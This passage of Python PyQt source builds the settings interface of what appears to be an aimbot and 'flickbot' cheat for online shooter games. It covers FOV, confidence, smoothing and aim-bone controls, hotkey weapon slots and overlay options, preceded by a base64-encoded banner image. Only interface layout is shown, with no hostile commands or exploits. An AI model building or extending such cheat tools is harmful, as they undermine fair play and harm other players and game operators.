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"
        ]
        selected_image = random.choice(image_files)
        image_data = base64.b64decode(selected_image)
        image = QImage()
        image.loadFromData(image_data)
        pixmapdd = QPixmap.fromImage(image)
        self.bannerdd.setPixmap(pixmapdd)
        self.bannerdd.setAlignment(Qt.AlignCenter)
        banner_layout.addWidget(self.bannerdd)

        aimbot_layout = QVBoxLayout()
        aimbot_layout.addWidget(self.Enable_Aim_checkbox)
        aimbot_layout.addWidget(self.Controller_On_checkbox)
        button_container_layout05 = QHBoxLayout()
        button_container_layout05.addWidget(self.hotkey_label)
        button_container_layout05.addWidget(self.btn_hotkey)
        button_container_layout05.addWidget(self.hotkey_label2)
        button_container_layout05.setAlignment(Qt.AlignLeft)
        button_container_layout05.addWidget(self.btn_hotkey2)
        aimbot_layout.addLayout(button_container_layout05)
        aimbot_layout.addSpacing(5)
        aimbot_layout.addWidget(separator_line1)
        aimbot_layout.addSpacing(5)
        button_container_layout00 = QHBoxLayout()
        button_container_layout00.addWidget(self.slider)
        button_container_layout00.addWidget(self.Fov_Size_label)
        aimbot_layout.addLayout(button_container_layout00)
        button_container_layout01 = QHBoxLayout()
        button_container_layout01.addWidget(self.slider0)
        button_container_layout01.addWidget(self.Confidence_label)
        aimbot_layout.addLayout(button_container_layout01)
        button_container_layout03 = QHBoxLayout()
        button_container_layout03.addWidget(self.slider3)
        button_container_layout03.addWidget(self.Aim_Smooth_label)
        aimbot_layout.addLayout(button_container_layout03)
        aimbot_layout.addSpacing(2)
        button_container_layout04 = QHBoxLayout()
        button_container_layout04.addWidget(self.aim_bone_combobox)
        button_container_layout04.addWidget(self.aim_bone_label)
        aimbot_layout.addLayout(button_container_layout04)
        button_container_layout53 = QHBoxLayout()
        button_container_layout53.addWidget(self.smoothing_type_combobox)
        button_container_layout53.addWidget(self.smoothing_type_label)
        aimbot_layout.addLayout(button_container_layout53)
        aimbot_layout.addSpacing(3)
        aimbot_layout.addWidget(self.btn_extraini2)
        aimbot_layout.addSpacing(5)
        aimbot_layout.addWidget(separator_line2)
        aimbot_layout.addWidget(self.Welcome_label_1)

        slots_layout = QVBoxLayout()
        slots_layout.addWidget(self.Enable_Slots_checkbox)
        # Slot 1
        button_container_layout_slot1 = QHBoxLayout()
        button_container_layout_slot1.addWidget(self.hotkey_label_slot1)
        button_container_layout_slot1.addWidget(self.btn_hotkey_slot1)
        button_container_layout_slot1.addWidget(self.slider_slot1)
        button_container_layout_slot1.addWidget(self.Fov_Size_label_slot1)
        button_container_layout_slot1.addWidget(self.Enable_Aim_Slot1_checkbox)
        button_container_layout_slot1.setAlignment(Qt.AlignLeft)
        slots_layout.addLayout(button_container_layout_slot1)
        # Slot 2
        button_container_layout_slot2 = QHBoxLayout()
        button_container_layout_slot2.addWidget(self.hotkey_label_slot2)
        button_container_layout_slot2.addWidget(self.btn_hotkey_slot2)
        button_container_layout_slot2.addWidget(self.slider_slot2)
        button_container_layout_slot2.addWidget(self.Fov_Size_label_slot2)
        button_container_layout_slot2.addWidget(self.Enable_Aim_Slot2_checkbox)
        button_container_layout_slot2.setAlignment(Qt.AlignLeft)
        slots_layout.addLayout(button_container_layout_slot2)
        # Slot 3
        button_container_layout_slot3 = QHBoxLayout()
        button_container_layout_slot3.addWidget(self.hotkey_label_slot3)
        button_container_layout_slot3.addWidget(self.btn_hotkey_slot3)
        button_container_layout_slot3.addWidget(self.slider_slot3)
        button_container_layout_slot3.addWidget(self.Fov_Size_label_slot3)
        button_container_layout_slot3.addWidget(self.Enable_Aim_Slot3_checkbox)
        button_container_layout_slot3.setAlignment(Qt.AlignLeft)
        slots_layout.addLayout(button_container_layout_slot3)
        # Slot 4
        button_container_layout_slot4 = QHBoxLayout()
        button_container_layout_slot4.addWidget(self.hotkey_label_slot4)
        button_container_layout_slot4.addWidget(self.btn_hotkey_slot4)
        button_container_layout_slot4.addWidget(self.slider_slot4)
        button_container_layout_slot4.addWidget(self.Fov_Size_label_slot4)
        button_container_layout_slot4.addWidget(self.Enable_Aim_Slot4_checkbox)
        button_container_layout_slot4.setAlignment(Qt.AlignLeft)
        slots_layout.addLayout(button_container_layout_slot4)
        # Slot 5
        button_container_layout_slot5 = QHBoxLayout()
        button_container_layout_slot5.addWidget(self.hotkey_label_slot5)
        button_container_layout_slot5.addWidget(self.btn_hotkey_slot5)
        button_container_layout_slot5.addWidget(self.slider_slot5)
        button_container_layout_slot5.addWidget(self.Fov_Size_label_slot5)
        button_container_layout_slot5.addWidget(self.Enable_Aim_Slot5_checkbox)
        button_container_layout_slot5.setAlignment(Qt.AlignLeft)
        slots_layout.addLayout(button_container_layout_slot5)
        # Slot 6
        button_container_layout_slot6 = QHBoxLayout()
        button_container_layout_slot6.addWidget(self.hotkey_label_slot6)
        button_container_layout_slot6.addWidget(self.btn_hotkey_slot6)
        button_container_layout_slot6.setAlignment(Qt.AlignLeft)
        slots_layout.addLayout(button_container_layout_slot6)

        slots_layout.addSpacing(5)
        slots_layout.addWidget(separator_line14)
        slots_layout.addWidget(self.Welcome_label_7)

        flickbot_layout = QVBoxLayout()
        flickbot_layout.addWidget(self.Enable_Flick_checkbox)
        button_container_layout_flick_key = QHBoxLayout()
        button_container_layout_flick_key.addWidget(self.hotkey_label4)
        button_container_layout_flick_key.setAlignment(Qt.AlignLeft)
        button_container_layout_flick_key.addWidget(self.btn_hotkey4)
        flickbot_layout.addLayout(button_container_layout_flick_key)
        flickbot_layout.addSpacing(5)
        flickbot_layout.addWidget(separator_line11)
        flickbot_layout.addSpacing(5)
        flickbot_layout.addWidget(self.flick_set_info_label)

        button_container_layout_flick_scope = QHBoxLayout()
        button_container_layout_flick_scope.addWidget(self.flick_scope_slider)
        button_container_layout_flick_scope.addWidget(self.flick_scope_label)
        flickbot_layout.addLayout(button_container_layout_flick_scope)

        button_container_layout_flick_cool = QHBoxLayout()
        button_container_layout_flick_cool.addWidget(self.flick_cool_slider)
        button_container_layout_flick_cool.addWidget(self.flick_cool_label)
        flickbot_layout.addLayout(button_container_layout_flick_cool)
        button_container_layout_flick_delay = QHBoxLayout()
        button_container_layout_flick_delay.addWidget(self.flick_delay_slider)
        button_container_layout_flick_delay.addWidget(self.flick_delay_label)
        flickbot_layout.addLayout(button_container_layout_flick_delay)
        flickbot_layout.addSpacing(5)
        flickbot_layout.addWidget(separator_line12)
        flickbot_layout.addWidget(self.Welcome_label_2)

        visual_layout = QVBoxLayout()

        button_container_layout055 = QHBoxLayout()
        # button_container_layout055.addWidget(self.hue_slider)
        # button_container_layout055.addWidget(self.rgb_label)
        visual_layout.addLayout(button_container_layout055)

        button_container_layout06 = QHBoxLayout()
        # button_container_layout06.addWidget(self.lightness_slider)
        # button_container_layout06.addWidget(self.lightness_label)
        visual_layout.addLayout(button_container_layout06)

        button_container_layout07 = QHBoxLayout()
        # button_container_layout07.addWidget(self.opacity_slider)
        # button_container_layout07.addWidget(self.opacity_label)
        visual_layout.addLayout(button_container_layout07)

        # visual_layout.addSpacing(5)
        # visual_layout.addWidget(separator_line3)
        visual_layout.addSpacing(5)
        #visual_layout.addWidget(self.Streamproof_checkbox)
        visual_layout.addWidget(self.Use_Hue_checkbox)
        visual_layout.addWidget(self.Show_Fov_checkbox)
        visual_layout.addWidget(self.Show_Crosshair_checkbox)
        visual_layout.addWidget(self.Show_Detections_checkbox)
        visual_layout.addWidget(self.Show_Aimline_checkbox)
        visual_layout.addWidget(self.Show_Fov_checkbox)
        visual_layout.addWidget(self.Show_Debug_checkbox)
        visual_layout.addWidget(self.Show_CMD_checkbox)

        button_container_layout12 = QHBoxLayout()
        button_container_layout12.addWidget(self.box_type_combobox)
        button_container_layout12.addWidget(self.box_type_label)
        visual_layout.addLayout(button_container_layout12)

